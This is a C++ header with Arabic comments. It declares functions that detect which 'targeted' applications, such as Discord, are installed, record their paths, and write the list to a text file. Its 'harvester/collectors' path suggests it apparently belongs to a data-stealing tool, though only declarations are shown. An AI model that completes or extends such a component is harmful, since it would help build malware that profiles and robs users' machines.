// harvester/collectors/app_detector.h
#pragma once

#include <string>
#include <vector>

// بنية لتخزين نتيجة الكشف عن تطبيق
struct DetectedApp {
    std::string name;      // اسم التطبيق (مثل "Discord")
    bool found;            // هل تم العثور عليه؟
    std::string path;      // مسار التثبيت (إذا وجد)
};

// قائمة بجميع التطبيقات المستهدفة (يعيد أسماء المعرفات)
std::vector<int> GetTargetAppIDs();

// يكتشف وجود التطبيقات ويعيد قائمة بـ DetectedApp
std::vector<DetectedApp> DetectTargetedApps();

// يحفظ قائمة التطبيقات المكتشفة في ملف نصي (detected_apps.txt) مع علامات [x]
void SaveDetectedAppsToFile(const std::vector<DetectedApp>& apps, const std::string& outputDir);